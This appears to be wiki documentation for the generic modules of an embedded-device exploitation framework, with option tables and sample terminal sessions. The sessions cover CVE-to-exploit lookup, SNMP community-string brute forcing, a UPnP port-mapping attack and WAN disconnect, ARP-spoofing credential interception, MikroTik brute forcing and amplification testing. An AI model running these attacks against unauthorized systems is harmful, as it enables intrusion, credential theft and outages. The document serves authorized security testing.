# Generic Modules

**Language:** English (en-US) | **pt-BR:** [../pt-BR/08-modulos-generic.md](../pt-BR/08-modulos-generic.md)

---

## Overview

Generic modules operate across device classes and vendors. They target common protocols and cross-vendor services rather than vendor-specific vulnerabilities. These modules are located under `embedxpl/modules/generic/`.

---

## Module map

| Module | Path | Protocol | Description |
|--------|------|----------|-------------|
| CVE Lookup | `generic/cve/cve_lookup` | Internal DB | Map vendors/products to known CVEs, classify by exploitability |
| SNMP Bruteforce | `generic/snmp/snmp_bruteforce` | SNMP/UDP | Community string bruteforce (SNMPv1/v2c) |
| SNMP Trap Listener | `generic/snmp/snmp_trap_listener` | SNMP/UDP | Listen for SNMP trap events |
| UPnP SSDP M-SEARCH | `generic/upnp/ssdp_msearch` | UPnP/UDP | SSDP M-SEARCH device discovery |
| UPnP IGD Full Exploit | `generic/upnp/igd_exploit` | UPnP/HTTP | Full IGD exploitation suite (11 actions) |
| Wordlist Generator | `generic/wordlist/wordlist_generator` | — | Interactive custom wordlist builder |
| DNS Hijack Detector | `generic/dns_hijack_detector` | DNS | Detect DNS hijacking on the network |
| AiTM Credential Interceptor | `generic/aitm_credential_interceptor` | HTTP/ARP | Adversary-in-the-Middle credential interception |
| TCP Xmas Scan | `generic/tcp_xmas` | TCP | TCP Xmas packet scan |
| UDP Amplification | `generic/udp_amplification` | UDP | UDP amplification factor measurement |
| ExploitDB Embedded Lookup | `generic/external/exploitdb_embedded_lookup` | Internal | Query ExploitDB metadata for a CVE |
| Metasploit Console Bridge | `generic/external/metasploit_console_bridge` | External | Bridge to Metasploit Framework console |
| Metasploit RB Inspect | `generic/external/metasploit_rb_inspect` | External | Inspect Metasploit Ruby module details |
| MikrotikAPI-BF Bridge | `generic/external/mikrotikapi_bf_bridge` | External | Bridge to MikrotikAPI-BF brute-forcer |
| WAFW00F Bridge | `generic/external/wafw00f_bridge` | External | Bridge to WAFW00F WAF detection tool |

---

## CVE Lookup (`generic/cve/cve_lookup`)

Queries the embedded CVE database to list known vulnerabilities for a target device identified by vendor, product model, firmware version, or raw banner text. Classifies results as REMOTE/LOCAL/PHYSICAL and shows which CVEs have ready-to-use EmbedXPL-Forge exploit modules.

### Options

| Option | Type | Required | Default | Accepted values | Description |
|--------|------|----------|---------|-----------------|-------------|
| `vendor` | `OptString` | No* | `""` | Any vendor string | Vendor name (e.g. `cisco`, `tplink`, `netgear`, `hikvision`, `fortinet`) |
| `product` | `OptString` | No* | `""` | Any product/model string | Product or model name (e.g. `r7000`, `fortigate`, `ds-2cd`) |
| `version` | `OptString` | No | `""` | Any version string | Firmware/software version (narrows results) |
| `banner` | `OptString` | No* | `""` | Raw banner text | Alternative to vendor+product; paste from banner grab |
| `remote_only` | `OptBool` | No | `False` | `true`, `false` | Show only remotely exploitable CVEs |
| `show_physical` | `OptBool` | No | `True` | `true`, `false` | Include LOCAL/PHYSICAL CVEs in output |

\* At least one of `vendor`, `product`, or `banner` is required.

### Terminal session — lookup by vendor

```text
exf > use generic/cve/cve_lookup
exf (CVE Lookup by Banner / Vendor / Product) > set vendor hikvision
[+] vendor => hikvision
exf (CVE Lookup by Banner / Vendor / Product) > run
[*] Running module ...
[*] CVE Database: 14382 entries | 9841 remote | 847 with exf module | 312 vendors

[*] --- CVE Results (28 total) ---

[+] === EXPLOITABLE by EmbedXPL-Forge (6) ===

[+]   CVE-2021-36260 | CVSS 9.8 | NETWORK
      Product: Hikvision / IP Camera | Versions: firmware <= 2021-06
      Unauthenticated OS command injection via HTTP PUT /SDK/webLanguage
      Module: exploits/cameras/hikvision/rtsp_rce_cve_2021_36260

[+]   CVE-2017-7921 | CVSS 9.8 | NETWORK
      Product: Hikvision / IP Camera | Versions: all
      Unauthenticated configuration and credential disclosure
      Module: exploits/cameras/hikvision/info_disclosure_cve_2017_7921

[+]   CVE-2023-28808 | CVSS 9.8 | NETWORK
      Product: Hikvision / NAS | Versions: firmware < 2023-08
      Authentication bypass in NAS web interface
      Module: exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808

...

[*] === REMOTE — no exf module yet (14) ===

      CVE-2022-28173 | CVSS 9.8 | NETWORK
      ...

[*] --- Summary ---
  Total CVEs matched:        28
  Exploitable by exf:        6
  Remote (no module yet):    14
  Local/Physical only:       8

[+] Quick exploit commands:
  use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
  use exploits/cameras/hikvision/info_disclosure_cve_2017_7921
  use exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808
```

### Terminal session — lookup by banner

```text
exf (CVE Lookup by Banner / Vendor / Product) > set banner "NETGEAR R7000 V1.0.11.116"
[+] banner => NETGEAR R7000 V1.0.11.116
exf (CVE Lookup by Banner / Vendor / Product) > set remote_only true
[+] remote_only => true
exf (CVE Lookup by Banner / Vendor / Product) > run
[*] CVE Database: 14382 entries | 9841 remote | 847 with exf module | 312 vendors

[+] === EXPLOITABLE by EmbedXPL-Forge (3) ===

[+]   CVE-2016-6277 | CVSS 9.8 | NETWORK
      Product: NETGEAR / R7000 | Versions: <= V1.0.11.116
      Unauthenticated command injection
      Module: exploits/routers/netgear/netgear_r7000_r6400_rce_cve_2016_6277

[+]   CVE-2020-35225 | CVSS 9.8 | NETWORK
      Product: NETGEAR / R7000 | Versions: <= 1.0.11.116
      Unauthenticated stack overflow RCE
      Module: exploits/routers/netgear/r7000_stack_overflow_cve_2020_35225
...
```

### Terminal session — lookup by product + version

```text
exf (CVE Lookup by Banner / Vendor / Product) > set vendor fortinet
[+] vendor => fortinet
exf (CVE Lookup by Banner / Vendor / Product) > set product fortigate
[+] product => fortigate
exf (CVE Lookup by Banner / Vendor / Product) > set version 7.0.6
[+] version => 7.0.6
exf (CVE Lookup by Banner / Vendor / Product) > run
...
```

### Error case — nothing specified

```text
exf (CVE Lookup by Banner / Vendor / Product) > run
[-] Set at least one of: vendor, product, or banner
    Example: set vendor netgear
    Example: set banner 'NETGEAR R7000'
```

### Check behavior

```text
exf (CVE Lookup by Banner / Vendor / Product) > check
[+] Target is vulnerable
# (Returns True if the embedded CVE database has entries)
```

---

## SNMP Modules

### SNMP Bruteforce (`generic/snmp/snmp_bruteforce`)

Tests a list of community strings against an SNMP-enabled target. On success, extracts `sysDescr` for device fingerprinting.

#### Options

| Option | Type | Required | Default | Accepted values | Description |
|--------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | Target IP address |
| `port` | `OptPort` | No | `161` | 1–65535 | SNMP UDP port |
| `wordlist` | `OptString` | No | `""` | File path | Path to community string wordlist (empty = use built-in list) |
| `timeout` | `OptPort` | No | `3` | 1–60 | UDP response timeout in seconds |

**Built-in default community strings:**
`public`, `private`, `community`, `admin`, `manager`, `monitor`, `default`, `cisco`, `router`, `switch`, `secret`, `password`, `read`, `write`, `snmp`, `network`, `guest`, `test`, `internal`, `access`, `0`, `1234`, `cable-docsis`, `ILMI`

#### Terminal session

```text
exf > use generic/snmp/snmp_bruteforce
exf (SNMP Community String Bruteforce) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (SNMP Community String Bruteforce) > run
[*] Running module ...
[*] Testing community string: public
[+] VALID community string: public (SNMPv2c)
    sysDescr: Cisco IOS Software, 15.7(3)M4
    sysName: Router-HQ-01
    sysLocation: Server Room A
[*] Testing community string: private
[+] VALID community string: private (SNMPv2c)
    sysDescr: Cisco IOS Software, 15.7(3)M4
[*] Testing community string: community
[-] FAIL: community
...
Summary: 2 valid community string(s) found: public, private
```

#### Terminal session — custom wordlist

```text
exf (SNMP Community String Bruteforce) > set wordlist /tmp/snmp_communities.txt
[+] wordlist => /tmp/snmp_communities.txt
exf (SNMP Community String Bruteforce) > run
[*] Loading community strings from /tmp/snmp_communities.txt (48 entries)...
[*] Testing community string: public
[+] VALID: public
...
```

---

### SNMP Trap Listener (`generic/snmp/snmp_trap_listener`)

Listens for SNMP trap PDUs on UDP. Useful for validating SNMP trap configurations during network device assessments.

#### Options

| Option | Type | Required | Default | Accepted values | Description |
|--------|------|----------|---------|-----------------|-------------|
| `listen_host` | `OptString` | No | `0.0.0.0` | IP or hostname | Listener bind address |
| `listen_port` | `OptPort` | No | `162` | 1–65535 | UDP port for SNMP traps |
| `timeout` | `OptInteger` | No | `30` | 1–3600 | Listener timeout in seconds |
| `max_packets` | `OptInteger` | No | `50` | 1–10000 | Maximum packets to capture before stopping |
| `contains` | `OptString` | No | `""` | Any string | Filter: only report packets containing this ASCII token |
| `hex_dump` | `OptBool` | No | `False` | `true`, `false` | Print packet payload as hex |

#### Terminal session

```text
exf > use generic/snmp/snmp_trap_listener
exf (SNMP Trap Listener) > set listen_port 162
[+] listen_port => 162
exf (SNMP Trap Listener) > set timeout 60
[+] timeout => 60
exf (SNMP Trap Listener) > run
[*] SNMP trap listener started on 0.0.0.0:162 timeout=60s max_packets=50
[*] [trap] 192.168.1.1:49281 bytes=84 match=True
[*] [trap] 192.168.1.2:49160 bytes=112 match=True
[*] Timeout reached after 60s. 2 packet(s) captured.
```

#### Terminal session — with token filter and hex dump

```text
exf (SNMP Trap Listener) > set contains linkDown
[+] contains => linkDown
exf (SNMP Trap Listener) > set hex_dump true
[+] hex_dump => true
exf (SNMP Trap Listener) > run
[*] SNMP trap listener started on 0.0.0.0:162 timeout=30s max_packets=50
[*] [trap] 192.168.1.5:50123 bytes=96 match=True
30605d020101040670756...
```

---

## UPnP Modules

### UPnP SSDP M-SEARCH (`generic/upnp/ssdp_msearch`)

Sends an SSDP M-SEARCH multicast/unicast probe and parses UPnP device response data (Server, Location, USN).

#### Options

| Option | Type | Required | Default | Accepted values | Description |
|--------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 or IPv6 | Target IP (use `239.255.255.250` for LAN multicast) |
| `port` | `OptPort` | No | `1900` | 1–65535 | SSDP UDP port |

#### Terminal session

```text
exf > use generic/upnp/ssdp_msearch
exf (SSDP M-SEARCH Info Discovery) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (SSDP M-SEARCH Info Discovery) > run
[*] Running module ...
[*] 192.168.1.1:1900 | MiniUPnP/2.1 UPnP/1.1 | http://192.168.1.1:49152/rootDesc.xml | uuid:c4d3e2f1-a0b9-c8d7-e6f5-a4b3c2d1e0f9::upnp:rootdevice
```

#### Terminal session — no response

```text
exf (SSDP M-SEARCH Info Discovery) > set target 10.0.0.5
[+] target => 10.0.0.5
exf (SSDP M-SEARCH Info Discovery) > run
[-] Target did not respond to M-SEARCH request
```

---

### UPnP IGD Full Exploit (`generic/upnp/igd_exploit`)

The most comprehensive UPnP module. Chains 11 actions including SSDP discovery, device XML parsing, service enumeration, external IP disclosure, port mapping manipulation, WAN status, traffic statistics, and event subscription.

#### Options

| Option | Type | Required | Default | Accepted values | Description |
|--------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4, IPv6, hostname | Target router/gateway |
| `port` | `OptPort` | No | `1900` | 1–65535 | SSDP port for discovery phase |
| `upnp_port` | `OptPort` | No | `0` | 0–65535 | UPnP HTTP port (`0` = auto-discover via SSDP) |
| `test_port` | `OptPort` | No | `31337` | 1–65535 | External port for AddPortMapping test |
| `skip_dangerous` | `OptString` | No | `yes` | `yes`, `no` | Skip ForceTermination (WAN disconnect/DoS) |

#### Terminal session (full chain)

```text
exf > use generic/upnp/igd_exploit
exf (UPnP IGD Full Exploitation) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (UPnP IGD Full Exploitation) > run
[*] Running module ...

[*] Phase 1: SSDP M-SEARCH discovery on 192.168.1.1:1900...
[+] IGD discovered at http://192.168.1.1:49152/rootDesc.xml
    Server: MiniUPnP/2.1 UPnP/1.1

[*] Phase 2: Parsing device description XML...
[+] Device: Huawei EG8145X6
    Manufacturer: Huawei Technologies Co., Ltd
    Model: EG8145X6
    Serial: 21280424
    Services: WANCommonInterfaceConfig, WANIPConnection, Layer3Forwarding

[*] Phase 3: SCPD action enumeration...
[+] WANIPConnection actions: GetExternalIPAddress, AddPortMapping, DeletePortMapping,
    GetGenericPortMappingEntry, GetStatusInfo, GetNATRSIPStatus, ForceTermination

[*] Phase 4: GetExternalIPAddress (unauthenticated)...
[+] External (WAN) IP: 203.0.113.45

[*] Phase 5: GetGenericPortMappingEntry — existing NAT mappings...
[+] Mapping 0: TCP 8080 -> 192.168.1.100:8080 (LAN_MEDIA)
[+] Mapping 1: UDP 53 -> 192.168.1.1:53 (DNS_FORWARD)
[+] Mapping 2: TCP 22 -> 192.168.1.50:22 (SSH_MGMT)

[*] Phase 6: AddPortMapping — test (port 31337)...
[+] Port mapping ADDED (no authentication required): TCP 31337 -> 192.168.1.1:31337
    CRITICAL: Unauthenticated firewall bypass confirmed

[*] Phase 7: DeletePortMapping — cleaning up test mapping...
[+] Port mapping 31337 deleted

[*] Phase 8: GetStatusInfo / GetNATRSIPStatus...
[+] WAN Status: Connected
    Uptime: 1209600s (14 days)
    LastConnectionError: ERROR_NONE

[*] Phase 9: WANCommonInterfaceConfig — traffic statistics...
[+] Link type: IP_Routed
    Bytes sent: 4,823,910,122
    Bytes received: 48,291,023,441
    Packets sent: 18,291,043
    Packets received: 61,029,847

[*] Phase 10: ForceTermination — SKIPPED (skip_dangerous=yes)

[*] Phase 11: Event SUBSCRIBE (WANIPConnection)...
[+] SUBSCRIBE accepted — SID: uuid:event-session-4f8c2e1b

Summary: 9/11 actions succeeded. 1 skipped (ForceTermination). 1 N/A.
CRITICAL FINDING: Unauthenticated AddPortMapping (phase 6) — firewall bypass without authentication.
```

#### Terminal session — ForceTermination enabled

```text
exf (UPnP IGD Full Exploitation) > set skip_dangerous no
[+] skip_dangerous => no
exf (UPnP IGD Full Exploitation) > run
...
[*] Phase 10: ForceTermination (WAN disconnect)...
[!] WARNING: ForceTermination will disconnect the WAN interface
[+] ForceTermination — response: 200 OK
[!] WAN connection may have been dropped on 192.168.1.1
```

---

## Wordlist Generator (`generic/wordlist/wordlist_generator`)

Interactively generates custom password and username wordlists based on target profile (corporate or personal). Applies mutation rules inspired by crunch/CUPP: leet speak, case variations, number/year suffixes, date fragments, word combinations.

### Options

| Option | Type | Required | Default | Accepted values | Description |
|--------|------|----------|---------|-----------------|-------------|
| `output_file` | `OptString` | No | `exf_wordlist.txt` | File path | Output file for generated wordlist |
| `profile` | `OptString` | No | `corporate` | `corporate`, `personal` | Target profile type |

### Terminal session (interactive)

```text
exf > use generic/wordlist/wordlist_generator
exf (Interactive Wordlist Generator) > run

[*] Interactive Wordlist Generator
[*] Profile: corporate | personal? [corporate]:
[*] Company name []: ACME Corp
[*] Include year mutations? [Y/n]:
[*] Include leet speak? [Y/n]:
[*] Include case variations? [Y/n]:
[*] Include number suffixes? [Y/n]:
[*] Additional keywords (comma-separated) []: router,admin,acme
[*] Estimating wordlist size...
[*] Estimated: 1,847 entries (~14 KB)
[*] Proceed? [Y/n]:
[*] Generating wordlist...
[+] Wordlist saved to: exf_wordlist.txt (1,847 entries)
[*] Use with any brute-force module:
    set defaults file:///path/to/exf_wordlist.txt
```

---

## DNS Hijack Detector (`generic/dns_hijack_detector`)

Detects DNS hijacking by comparing DNS responses for known-good domains against expected IP addresses.

```text
exf > use generic/dns_hijack_detector
exf (DNS Hijack Detector) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (DNS Hijack Detector) > run
[*] Testing DNS resolution via 192.168.1.1...
[*] Resolving google.com... expected: 142.250.x.x, received: 142.250.200.4 (OK)
[*] Resolving cloudflare.com... expected: 104.16.x.x, received: 104.16.132.229 (OK)
[*] Resolving example.com... expected: 93.184.216.34, received: 192.0.2.1 (MISMATCH!)
[+] DNS hijacking DETECTED: example.com resolves to 192.0.2.1 instead of 93.184.216.34
[!] The DNS server at 192.168.1.1 may be hijacking DNS responses.
```

---

## AiTM Credential Interceptor (`generic/aitm_credential_interceptor`)

Adversary-in-the-Middle credential interception module. Intercepts HTTP credentials in transit.

> **Authorization required.** Only use on networks you control or have explicit authorization to test.

```text
exf > use generic/aitm_credential_interceptor
exf (AiTM Credential Interceptor) > show options
# Set interface, target IPs, etc.
exf (AiTM Credential Interceptor) > run
[*] ARP spoofing initiated...
[*] [HTTP] POST http://192.168.1.200/login — username=admin&password=router123
[+] Credentials intercepted: admin:router123 from 192.168.1.101
```

---

## External tool bridges

### ExploitDB Embedded Lookup (`generic/external/exploitdb_embedded_lookup`)

Queries the embedded ExploitDB metadata for a CVE identifier.

```text
exf > use generic/external/exploitdb_embedded_lookup
exf (ExploitDB Lookup) > set cve CVE-2021-36260
[+] cve => CVE-2021-36260
exf (ExploitDB Lookup) > run
[*] Searching ExploitDB for CVE-2021-36260...
[+] EDB-50441: Hikvision IP Camera - Remote Code Execution (CVE-2021-36260)
    Type: Remote / WebApps
    Platform: Hardware
    Date: 2021-10-08
    URL: https://www.exploit-db.com/exploits/50441
```

### Metasploit Console Bridge (`generic/external/metasploit_console_bridge`)

Bridges commands to a running Metasploit Framework MSFRPC server.

```text
exf > use generic/external/metasploit_console_bridge
exf (Metasploit Console Bridge) > set msf_host 127.0.0.1
[+] msf_host => 127.0.0.1
exf (Metasploit Console Bridge) > set msf_port 55553
[+] msf_port => 55553
exf (Metasploit Console Bridge) > run
[*] Connecting to Metasploit MSFRPC at 127.0.0.1:55553...
[+] Connected. Metasploit Framework 6.3.x
msf6 > search hikvision
...
```

### MikrotikAPI-BF Bridge (`generic/external/mikrotikapi_bf_bridge`)

Bridges to the MikrotikAPI-BF credential brute-forcer (separate tool).

```text
exf > use generic/external/mikrotikapi_bf_bridge
exf (MikrotikAPI-BF Bridge) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (MikrotikAPI-BF Bridge) > run
[*] Launching MikrotikAPI-BF against 192.168.1.1:8728...
[*] Trying admin:admin...
[+] SUCCESS: admin:admin
```

---

## TCP/UDP probe modules

### TCP Xmas Scan (`generic/tcp_xmas`)

Sends TCP Xmas packets (FIN+PSH+URG flags) to test port state detection.

```text
exf > use generic/tcp_xmas
exf (TCP Xmas Scan) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (TCP Xmas Scan) > set port 80
[+] port => 80
exf (TCP Xmas Scan) > run
[*] Sending TCP Xmas packet to 192.168.1.1:80...
[*] No response — port likely OPEN|FILTERED
```

### UDP Amplification Measurement (`generic/udp_amplification`)

Measures UDP amplification factor for protocols like DNS, NTP, SSDP, SNMP.

```text
exf > use generic/udp_amplification
exf (UDP Amplification) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (UDP Amplification) > run
[*] Testing DNS amplification on 192.168.1.1:53...
[+] DNS: request=48 bytes, response=512 bytes — amplification factor: 10.7x
[*] Testing SSDP amplification on 192.168.1.1:1900...
[+] SSDP: request=102 bytes, response=1312 bytes — amplification factor: 12.9x
[!] High amplification factor on SSDP — potential DDoS reflection amplifier
```


[Wiki hub](../README.md)
